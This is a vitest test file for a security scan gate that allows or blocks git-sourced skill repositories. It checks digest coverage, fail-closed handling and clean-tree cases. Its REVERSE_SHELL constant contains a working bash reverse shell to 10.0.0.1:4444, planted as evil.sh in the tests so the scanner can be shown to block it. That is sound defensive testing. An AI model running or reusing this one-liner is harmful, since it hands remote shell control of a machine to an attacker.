import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  type ResolvedGitSource,
  resolveGitSource,
  runFastScanGate,
  scannableFromGit,
} from "../../src/binding/scan-gate.js";
import { defaultRunner } from "../../src/internals/proc.js";
import {
  buildTrustFileInventory,
  type TrustFileEntry,
  type TrustFileInventory,
} from "../../src/trust/inventory.js";

const REVERSE_SHELL = "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n";

let repoDir: string;
let cacheHome: string;

function git(dir: string, args: string[]): void {
  execFileSync("git", args, { cwd: dir, stdio: "pipe" });
}

function initGitRepo(files: Record<string, string>): void {
  mkdirSync(repoDir, { recursive: true });
  git(repoDir, ["init", "-b", "main"]);
  git(repoDir, ["config", "user.email", "t@example.com"]);
  git(repoDir, ["config", "user.name", "Coverage Test"]);
  git(repoDir, ["config", "commit.gpgsign", "false"]);
  for (const [rel, content] of Object.entries(files)) {
    const abs = join(repoDir, rel);
    mkdirSync(dirname(abs), { recursive: true });
    writeFileSync(abs, content);
  }
  git(repoDir, ["add", "-A"]);
  git(repoDir, ["commit", "-m", "init"]);
}

async function resolve(): Promise<ResolvedGitSource> {
  return resolveGitSource(
    { repository: repoDir, ref: "HEAD" },
    { runner: defaultRunner, cacheHome },
  );
}

beforeEach(() => {
  repoDir = mkdtempSync(join(tmpdir(), "aih-cov-repo-"));
  cacheHome = mkdtempSync(join(tmpdir(), "aih-cov-home-"));
});

afterEach(() => {
  for (const dir of [repoDir, cacheHome]) rmSync(dir, { recursive: true, force: true });
});

describe("scan covers the exact resolved digest (CM-27 / D7)", () => {
  for (const skipped of ["vendor", "dist", "node_modules"]) {
    it(`scans a malicious payload under ${skipped}/ that the digest pins`, async () => {
      initGitRepo({ "SKILL.md": "# skill\n", [`${skipped}/evil.sh`]: REVERSE_SHELL });
      const resolved = await resolve();
      // The payload path is folded into the identity digest.
      expect(resolved.files).toContain(`${skipped}/evil.sh`);
      // vibe + allowIncompleteAtVibe isolates the danger floor from coverage: the
      // block must come from the now-inspected malicious shape, not incompleteness.
      const disposition = runFastScanGate(
        scannableFromGit(resolved),
        { posture: "vibe", allowIncompleteAtVibe: true },
        { cacheHome },
      );
      expect(disposition.verdict).toBe("block");
      expect(disposition.findings.some((f) => f.severity === "critical")).toBe(true);
    });
  }

  it("forces incomplete coverage when an identity file is absent from the inventory", async () => {
    initGitRepo({ "a.txt": "one\n", "b.txt": "two\n" });
    const resolved = await resolve();
    // An inventory factory that drops one identity file simulates any scan/digest
    // fileset divergence.
    const dropping = (root: string): TrustFileInventory => {
      const real = buildTrustFileInventory(root, { skipDirs: new Set([".git"]) });
      const files = real.files.filter((entry) => entry.relativePath !== "b.txt");
      return {
        files,
        matching: (predicate: (entry: TrustFileEntry) => boolean) => files.filter(predicate),
      };
    };
    const src = scannableFromGit(resolved);

    expect(
      runFastScanGate(src, { posture: "enterprise" }, { cacheHome, inventoryFactory: dropping })
        .verdict,
    ).toBe("block");
    expect(
      runFastScanGate(src, { posture: "vibe" }, { cacheHome, inventoryFactory: dropping }).verdict,
    ).toBe("block");
    const allowed = runFastScanGate(
      src,
      { posture: "vibe", allowIncompleteAtVibe: true },
      { cacheHome, inventoryFactory: dropping },
    );
    expect(allowed.verdict).toBe("allow");
    expect(allowed.findings.some((f) => f.coverage === "incomplete")).toBe(true);
  });

  it("fails closed when a source carries no identity file list (cold and warm cache)", async () => {
    initGitRepo({ "SKILL.md": "# skill\n" });
    const resolved = await resolve();
    // A hand-built source with no identity list cannot certify it covered the
    // pinned digest; production always supplies it via scannableFromGit, so this
    // guards any future caller that constructs a ScannableSource directly.
    const noIdentity = { digest: resolved.treeDigest, treePath: resolved.treePath };
    expect(runFastScanGate(noIdentity, { posture: "enterprise" }, { cacheHome }).verdict).toBe(
      "block",
    );
    expect(runFastScanGate(noIdentity, { posture: "vibe" }, { cacheHome }).verdict).toBe("block");
    // Warming the cache with a correct source for the SAME digest must not let an
    // identity-less source ride that cache entry to an allow.
    expect(
      runFastScanGate(scannableFromGit(resolved), { posture: "enterprise" }, { cacheHome }).verdict,
    ).toBe("allow");
    expect(runFastScanGate(noIdentity, { posture: "enterprise" }, { cacheHome }).verdict).toBe(
      "block",
    );
  });

  it("keeps a clean tree with benign vendored/build content COMPLETE and allowed (no false incompletes)", async () => {
    initGitRepo({
      "SKILL.md": "# skill\n",
      "LICENSE.md": "MIT\n",
      "node_modules/dep/index.js": "export const x = 1;\n",
      "dist/out.js": "export const y = 2;\n",
    });
    const resolved = await resolve();
    const disposition = runFastScanGate(
      scannableFromGit(resolved),
      { posture: "enterprise" },
      { cacheHome },
    );
    expect(disposition.verdict).toBe("allow");
    expect(disposition.findings.every((f) => f.coverage === "complete")).toBe(true);
  });
});
